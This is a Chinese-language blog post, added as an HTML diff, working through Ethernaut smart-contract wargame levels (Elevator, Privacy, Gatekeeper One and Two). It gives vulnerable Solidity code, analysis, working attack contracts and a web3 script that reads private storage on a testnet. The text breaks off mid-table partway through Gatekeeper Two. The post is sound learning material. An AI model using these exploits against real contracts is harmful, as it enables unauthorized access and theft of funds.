@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://raw.githubusercontent.com/bcYng-w/images/main/32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://raw.githubusercontent.com/bcYng-w/images/main/16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":4},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Ethernaut刷题中">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ethernaut靶场刷题part2&#x2F;3">
+<meta property="og:url" content="http://example.com/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8B/index.html">
+<meta property="og:site_name" content="until">
+<meta property="og:description" content="Ethernaut刷题中">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lzhnb.site/png/3.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/11.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/7.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/9.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/5.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/27.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/18.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/6.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/10.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/22.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/21.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/17.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/25.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/2.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/4.png">
+<meta property="og:image" content="http://www.lzhnb.site/png/16.png">
+<meta property="article:published_time" content="2022-03-18T16:34:03.857Z">
+<meta property="article:modified_time" content="2022-03-18T16:36:32.431Z">
+<meta property="article:author" content="bcYng">
+<meta property="article:tag" content="区块链">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lzhnb.site/png/3.png">
+
+<link rel="canonical" href="http://example.com/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8B/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Ethernaut靶场刷题part2/3 | until</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">until</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/19/ethernaut%E9%9D%B6%E5%9C%BA%E5%88%B7%E9%A2%98%E4%B8%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/bcYng-w/images/main/touxaing.png">
+      <meta itemprop="name" content="bcYng">
+      <meta itemprop="description" content="前程似锦">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="until">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Ethernaut靶场刷题part2/3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-19 00:34:03 / 修改时间：00:36:32" itemprop="dateCreated datePublished" datetime="2022-03-19T00:34:03+08:00">2022-03-19</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Ethernaut刷题中</p>
+<span id="more"></span>
+
+<h1 id="1-Elevator"><a href="#1-Elevator" class="headerlink" title="1.Elevator"></a>1.Elevator</h1><p>题目要求：电梯不会让你达到大楼顶部, 对吧?使top变成true</p>
+<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><p>在这个if语句中进行了两次building.isLastFloor(_floor)调用，所以要先将builiding变成攻击合约，然后第一次调用传入false第二次传入true即可</p>
+<h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    bool public i=true;</span><br><span class="line">    function isLastFloor(uint)public returns(bool)&#123;</span><br><span class="line">        i=!i;</span><br><span class="line">        return i;</span><br><span class="line">    &#125;//两次调用，if判断时传入false，更改top时传入true</span><br><span class="line">    function a(uint fllor) public&#123;</span><br><span class="line">        Elevator target=Elevator(0xDA0bab807633f07f013f94DD0E6A4F96F8742B53);//设置被攻击合约地址</span><br><span class="line">        target.goTo(fllor);//让题目中的调用地址变为攻击合约</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="2-Privacy"><a href="#2-Privacy" class="headerlink" title="2.Privacy"></a>2.Privacy</h1><p>题目要求：The creator of this contract was careful enough to protect the sensitive areas of its storage. Unlock this contract to beat the level.</p>
+<p>Things that might help:</p>
+<ul>
+<li>Understanding how storage works</li>
+<li>Understanding how parameter parsing works</li>
+<li>Understanding how casting works</li>
+</ul>
+<p>Tips:</p>
+<ul>
+<li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li>
+</ul>
+<h2 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = 10;</span><br><span class="line">  uint8 private denomination = 255;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[2]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;//data[2]为bytes32[2]，所以我们要获得private的bytes32</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`</span><br><span class="line">      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,</span><br><span class="line">      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\</span><br><span class="line">      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-1"><a href="#Analyze-1" class="headerlink" title="Analyze"></a>Analyze</h2><p><strong><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9837#toc-7">存储机制学习①</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/115706983">存储机制学习②</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://blog.csdn.net/Blockchain_lemon/article/details/82836002">存储机制学习③</a></strong></p>
+<p><strong><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f01a5790e8cb">存储机制学习④</a></strong></p>
+<p><strong>相对做vault那道题时深入研究了一下存储方式的问题：根据 solidity 文档中的变量存储原则，evm 每一次处理 32 个字节，而不足 32 字节的变量相互共享并补齐 32 字节。(bool占1字节但是独占一个插槽，uint256和bytes32占32字节，uint8,16,根据比例可计算分别占据1，2字节)</strong></p>
+<p><img src="http://www.lzhnb.site/png/3.png" alt="image-20220119234440826"></p>
+<p><strong>变量查询代码</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3,HTTPProvider</span><br><span class="line"><span class="keyword">import</span> json,binascii</span><br><span class="line">http = <span class="string">&#x27;https://rinkeby.infura.io/v3/538e5cfe4f9a402cbc81eeb8205254ab&#x27;</span></span><br><span class="line">web3 = Web3(HTTPProvider(http))</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(web3.eth.getStorageAt(<span class="string">&quot;0x1203d029Db225601f986253526D1a8bD662782A6&quot;</span>, <span class="string">&quot;0&quot;</span>)))</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(web3.eth.getStorageAt(<span class="string">&quot;0x1203d029Db225601f986253526D1a8bD662782A6&quot;</span>, <span class="string">&quot;5&quot;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>题目中要求传入bytes16数据，将所得的bytes32转变成为bytes16，用到以下合约</p>
+<h2 id="Attack-1"><a href="#Attack-1" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">     Privacy target=Privacy(0x1203d029Db225601f986253526D1a8bD662782A6);</span><br><span class="line">     bytes16 public result; </span><br><span class="line">   function get(bytes32 trans)public&#123;</span><br><span class="line">       result=bytes16(trans);</span><br><span class="line">   &#125;</span><br><span class="line">     function pwn(bytes16 key)public&#123;</span><br><span class="line">         target.unlock(key);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="3-Gatekeeper-One"><a href="#3-Gatekeeper-One" class="headerlink" title="3.Gatekeeper One"></a>3.Gatekeeper One</h1><p>题目要求：Make it past the gatekeeper and register as an entrant to pass this level.</p>
+<p>Things that might help:</p>
+<ul>
+<li>Remember what you’ve learned from the Telephone and Token levels.</li>
+<li>You can learn more about the special function <code>gasleft()</code>, in Solidity’s documentation (see <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html">here</a> and <a target="_blank" rel="noopener" href="https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls">here</a>).</li>
+</ul>
+<h2 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;//使用合约进行攻击时tx.origin为钱包账户地址，msg.sender为攻击合约地址，part one即可绕过</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;//虚拟机中进行debug，传入gas为8191，观察执行完gas后所剩余gas，计算在此之前消耗的gas，在加上8191即为应传入gas</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) == uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;//绕过此部分的key构造在攻击合约中介绍</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="analyze"><a href="#analyze" class="headerlink" title="analyze"></a>analyze</h2><p>首先要了解类型转换机制，在虚拟机中部署一个测试合约，随意将一串字符转换成为bytes8格式</p>
+<p>并分别将其转变为uint64(result),uint32(uint64(result)),uint16(uint64(result))进行测试</p>
+<p>测试合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract test &#123;</span><br><span class="line">    bytes8 public result=bytes8(keccak256(&quot;abc&quot;));</span><br><span class="line">    function trans(bytes8 b)public view returns(uint)&#123;</span><br><span class="line">        return uint64(b);</span><br><span class="line">    &#125;</span><br><span class="line">    function trans1(bytes8 a)public view returns(uint)&#123;</span><br><span class="line">        return uint32(uint64(a));</span><br><span class="line">    &#125;</span><br><span class="line">    function trans3(bytes8 c)public view returns(uint)&#123;</span><br><span class="line">       return uint16(uint64(c));</span><br><span class="line">    &#125;</span><br><span class="line">     function trans4()public view returns(uint)&#123;</span><br><span class="line">        return uint8(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>转换结果</strong></p>
+<p><img src="http://www.lzhnb.site/png/11.png" alt="image-20220120231023392"></p>
+<p>bytes8包括了16个字母加数字，bytes8与uint64所占字节数相同，通过转换以及在线进制转换可以知道uint64(result)相当于bytes8即后十六位,uint32(uint64(result))相当于byte4即后八位,uint16(uint64(result))相当于bytes2即后四位【以上都是后几位】</p>
+<p>所以构造用于绕过的key可以这样构造：①根据gatethree的第一个require可知key的后四位应该和后八位相等即0000xxxx②根据gatethree的第二个require可知key的后八位应该和后十六位(共十六位)不相等即前八位不全为0③根据gatethree的第三个require可知key的后八位应该和tx.origin的后四位相等。所以最终构造的key为:<font color=#FF0000>  <em>0x12345678000022ad</em> </font>  </p>
+<p>学习gasleft函数：这个比较好理解，就是执行完gas之后剩余的gas，可以再虚拟机中debug功能中计算，以下是操作过程</p>
+<p>先传入8191的gas限制</p>
+<p><img src="http://www.lzhnb.site/png/7.png" alt="image-20220120233942130"></p>
+<p>部署合约并传入刚才构造的key进行攻击，此时交易失败，复制 transaction hash进行debug，找到执行完gas后的dup2，可以看到即剩余的gas为7940，所以在此之前消耗的gas为8191-7940&#x3D;251，所以传入的gas应该为81910+251&#x3D;82161</p>
+<p><img src="http://www.lzhnb.site/png/9.png" alt="image-20220120234353799"></p>
+<p><img src="http://www.lzhnb.site/png/5.png" alt="image-20220121000007053"></p>
+<p>综上可以写出攻击合约</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    GatekeeperOne target=GatekeeperOne(0x019F6D74cc988e55802adc44BD4130A3AC9C29a9);</span><br><span class="line">    function pwn(bytes8 key)public&#123;</span><br><span class="line">         address(target).call&#123;gas:82161&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">经过多次尝试后，均未通关，尝试更换编译器版本，结果发现每换一次版本，消耗的gas都不同(比如0.6.0版本消耗的是251，0.4.18版本消耗的是242，大概处在200~300的区间)，于是干脆换个写法，直接跑完200~300以内所有数字</span><br><span class="line">contract attack&#123;</span><br><span class="line">    GatekeeperOne target=GatekeeperOne(0x0bE148c2fF43dD082Eac236aD6085262c176DF8A);</span><br><span class="line">    function pwn(bytes8 key)public&#123;</span><br><span class="line">        for(uint i=200;i&lt;=300;i++)&#123;</span><br><span class="line">         address(target).call&#123;gas:81910+i&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">        &#125;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>虚拟机中和链上消耗的gas不相同，需要使用区块链浏览器进行调试，攻击合约改为以下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">contract attack1&#123;</span><br><span class="line">    GatekeeperOne target=GatekeeperOne(0xc338d2a9C388AF974304eB36f7dE0CE39DeaC559);</span><br><span class="line">    function pwn(bytes8 key)public&#123;</span><br><span class="line">         address(target).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">       &#125;</span><br><span class="line">&#125;在合约交互时，从metamask中设置gas limit</span><br></pre></td></tr></table></figure>
+
+<p>第一次gas limit设置为81910，得到如下结果</p>
+<p><img src="http://www.lzhnb.site/png/27.png" alt="image-20220121234436313"></p>
+<p><strong>第二次设置gas limit为81910-54095+81910&#x3D;109725，得到如下结果</strong></p>
+<p><img src="http://www.lzhnb.site/png/18.png" alt="image-20220121234514848"></p>
+<p><strong>第三次设置gas limit为81910-81475+109725&#x3D;110160,得到如下结果</strong></p>
+<p><img src="http://www.lzhnb.site/png/6.png" alt="image-20220121234931570"></p>
+<p><strong>第四次设置gas limit为81910-81903+110160&#x3D;110167，得到如下结果</strong></p>
+<p><img src="http://www.lzhnb.site/png/10.png" alt="image-20220121235148762"></p>
+<p><img src="http://www.lzhnb.site/png/22.png" alt="image-20220121235818889"></p>
+<ul>
+<li><input disabled="" type="checkbox"> </li>
+</ul>
+<h1 id="4-Gatekeeper-Two"><a href="#4-Gatekeeper-Two" class="headerlink" title="4.Gatekeeper Two"></a>4.Gatekeeper Two</h1><p>题目要求：This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
+<p>Things that might help:</p>
+<ul>
+<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
+<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf">yellow paper</a>.</li>
+<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
+</ul>
+<h2 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;//使用合约调用就可以绕过</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">    require(x == 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);</span><br><span class="line">    _;</span><br><span class="line">  &#125;//把^当成次方算了半天一直失败，后来才了解到是异或运算(因为题目要求是英文，导致提示没看懂)</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Analyze-2"><a href="#Analyze-2" class="headerlink" title="Analyze"></a>Analyze</h2><p><strong>运算符号学习</strong></p>
+<table>
+<thead>
+<tr>
+<th align="center">Precedence</th>
+<th align="center">Description</th>
+<th align="center">Operator</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center"><em>1</em></td>
+<td align="center">Postfix increment and decrement</td>
+<td align="center"><code>++</code>, <code>--</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">New expression</td>
+<td align="center">&#96;new <typename></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Array subscripting</td>
+<td align="center"><code>&lt;array&gt;[&lt;index&gt;]</code></td>
+</tr>
+<tr>
+<td align="center"></td>
+<td align="center">Member access</td>
+<td align="center"><code>&lt;object&gt;.&lt;member&gt;</code></td>
+</tr>
+<tr>
+<td align="center"></td>
